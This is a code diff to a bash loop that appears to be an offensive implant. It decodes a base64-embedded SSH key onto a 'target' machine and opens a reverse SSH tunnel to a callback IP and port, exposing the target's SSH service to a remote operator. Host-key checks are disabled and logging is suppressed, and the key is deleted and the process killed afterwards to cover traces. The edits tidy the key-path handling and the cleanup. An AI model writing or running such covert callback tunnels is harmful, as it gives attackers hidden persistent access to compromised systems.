@@ -31,12 +31,12 @@ do
 			REMLIS=$(get_value 3)
 			jumpto encoded
 			resume:
-			echo -e "$b64" | base64 -d > [/path/to/key/on/target]
+			echo "$b64" | base64 -d > ${KEY}
 			ssh -o LogLevel=quiet -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p ${CB_PORT} -R 127.0.0.1:${REMLIS}:127.0.0.1:${TARSSH} -i $KEY -N ${CB_IP} -l ${REMUSR} &
 			SSH_PID=$(ss -tuanp | egrep "$CB_IP":"$CB_PORT" | egrep -o "pid=[0-9]+" | cut -d "=" -f 2)
 #			SSH_PID=$(netstat -tuanp | egrep "$CB_IP":"$CB_PORT" | egrep -o "EST.*[0-9]+" | cut -d " " -f 2
-			rm -rf [/path/to/key/on/target]
-			sleep $SLEEP1 && kill -9 $SSH_PID && wait $! 2>/dev/null
+			sleep $SLEEP1 && rm -rf ${KEY}; kill -9 $SSH_PID && wait $! 2>/dev/null
+			continue
 		else
 			sleep $SLEEP2
 		fi
